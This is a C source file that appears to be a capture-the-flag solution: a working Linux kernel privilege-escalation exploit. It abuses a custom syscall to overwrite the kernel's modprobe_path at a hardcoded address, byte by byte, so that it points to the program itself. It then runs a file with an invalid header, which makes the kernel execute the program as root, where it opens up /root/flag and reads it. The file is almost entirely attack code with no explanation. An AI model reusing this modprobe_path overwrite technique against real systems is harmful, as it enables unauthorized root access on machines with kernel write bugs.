#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#ifndef __NR_PWN
#define __NR_PWN 451
#endif

/*
 * Slowly brute this thingy.
 *
 * $ cat /proc/sys/kernel/modprobe
 * /sbin/modprobe
 */

static bool is_char_ok(int i, const char *argv0) {
  int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
  assert(fd != -1);
  char val[256] = {};
  ssize_t n = read(fd, val, sizeof(val));
  assert(n != -1);
  close(fd);
  if (argv0[i] == 0) {
    if (val[n - 1] != '\n') {
      return false;
    }
    val[n - 1] = 0;
    printf("[%d] %s expected:%s\n", i, val, argv0);
    return strcmp(val, argv0) == 0;
  } else {
    printf("[%d] %s actual:%c expected:%c\n", i, val, val[i] & 0xff,
           argv0[i] & 0xff);
    return val[i] == argv0[i];
  }
}

#define modprobe_path 0xFFFFFFFF81A45CA0

static void randomize_char(int i) {
  errno = 0;
  long err = syscall(__NR_PWN, modprobe_path + i);
  if (err) {
    printf("[%d] %lx %d\n", i, err, errno);
  }
}

int main(int argc, char **argv) {
  (void)argc;

  open("/hello", O_RDWR | O_CREAT, 0777);

  if (chmod("/root", 0777) == 0 && chmod("/root/flag", 0777) == 0) {
    return 0;
  }

  if (1) {
    size_t len = strlen(argv[0]);
    for (size_t i = 0; i <= len; i++) {
      while (!is_char_ok(i, argv[0])) {
        randomize_char(i);
      }
    }
  }
  int fd = open("dummy", O_RDWR | O_CREAT, S_IRWXU);
  assert(fd != 0);
  unsigned char sig[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  write(fd, sig, sizeof(sig));
  close(fd);
  chmod("dummy", 0755);
  system("./dummy");
  system("cat /root/flag");
}
